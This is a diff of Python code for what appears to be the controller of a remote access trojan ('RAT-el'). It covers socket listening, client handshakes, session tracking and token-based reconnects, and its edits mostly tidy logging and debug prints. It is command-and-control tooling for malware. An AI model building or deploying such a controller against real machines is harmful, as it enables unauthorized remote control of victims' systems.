@@ -101,7 +101,8 @@ class Handler(threading.Thread):
                 
         Handler.start_handler = True #You can start the management 
         
-        self.sock_server.listen(10)
+        self.sock_server.listen(5) #https://stackoverflow.com/questions/41595176/accept-unlimited-connections-with-socket
+
         printColor("information","[+] the server listens on the port {}".format(self.port))
 
         while True:               
@@ -111,13 +112,7 @@ class Handler(threading.Thread):
             except Exception as e:
                 printColor("error","\n[+] error on listening (Handler)\n[+] forcing on process closure.\n\n")
                 os.kill(os.getpid()) #in test
-
-            if(Handler.status_connection_display):
-                printColor("information","\r[+] New client {}:{}".format(address[0],address[1]))
-            else:
-                pass
             
-         
             handshake = HandShake(conn,address,self.ObjSql)
             handshake.start()
             handshake.join()
@@ -140,10 +135,12 @@ The client first sends this information, then the server sends the parameters as
 
 
     def checkString(self, string_to_test, string_len_max):
+        
         '''
         test if the string is too big.
         If the string is too big it can cause display bugs.
         '''
+
         result = ""
         i = 0
         string_to_test = str(string_to_test)
@@ -208,16 +205,13 @@ The client first sends this information, then the server sends the parameters as
         while True:
             data = self.recvUltraSafe()
             
-            #print(data)
             if(data == "\r\n"):
                 break
            
             tmp = data.split(SPLIT)
             if(tmp[0]=="MOD_RECONNECT"): #MOD_RECONNECT  | TOKEN fdsafafsdfsadf3454sdfasdf5
-                #print("MOD RECONNECT DETECT")
+
                 token = tmp[1]
-                #print("TOKKEN: ", token)
-                #print(self.address)
                 
                 if bool(Handler.dict_conn): 
                     for target in Handler.dict_conn.values():
@@ -252,7 +246,6 @@ The client first sends this information, then the server sends the parameters as
 
             elif(tmp[0]=="MOD_HANDSHAKE_TOKEN"):
                 token = self.checkString(tmp[1], 40)
-                print(token)
 
             else:
                 printColor("error","[-] An error occurred during handshake mode.")
@@ -282,12 +275,15 @@ The client first sends this information, then the server sends the parameters as
 
         info = self.recvFirstInfo() #Collect informations with Handshake client. 
 
-
         if(bool(info)):#if not empty
             if type(info) == list:
                 if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
                     self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3])
                 Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3], False] #3 #True = Connexion is life 
+                
+                if(Handler.status_connection_display):
+                    printColor("information","\r[+] New client {}:{}".format(self.address[0],self.address[1]))
+                
                 Handler.number_conn+=1 
         
             if type(info) == tuple:#If the client tries to reconnect: | return Bool
@@ -295,7 +291,7 @@ The client first sends this information, then the server sends the parameters as
                 nb_session = info[1]
 
                 if(Handler.status_connection_display): #A TESTER !!
-                    printColor("information","[+] a client is trying to reconnect to the server: session: {} {}:{}\n".format(nb_session,self.address[0],self.address[1]) )
+                    printColor("information","[+] A client is trying to reconnect to the server: session: {} {}:{}".format(nb_session,self.address[0],self.address[1]) )
 
                 #Session number does not change value
                 Handler.dict_conn[nb_session][NB_SOCKET] = self.conn
@@ -313,7 +309,7 @@ The client first sends this information, then the server sends the parameters as
                 Handler.dict_conn[nb_session][NB_USERNAME] = self.ObjSql.returnValue(nb_session,"username")
                 #print("TOKEN: ")
                 Handler.dict_conn[nb_session][NB_TOKEN] = self.ObjSql.returnValue(nb_session,"token")
-                print("Reco TOKEN:", Handler.dict_conn[nb_session][NB_TOKEN])
+                #print("Reco TOKEN:", Handler.dict_conn[nb_session][NB_TOKEN])
                 #print("SELECT")
                 Handler.dict_conn[nb_session][NB_SELECT] = False 
                 
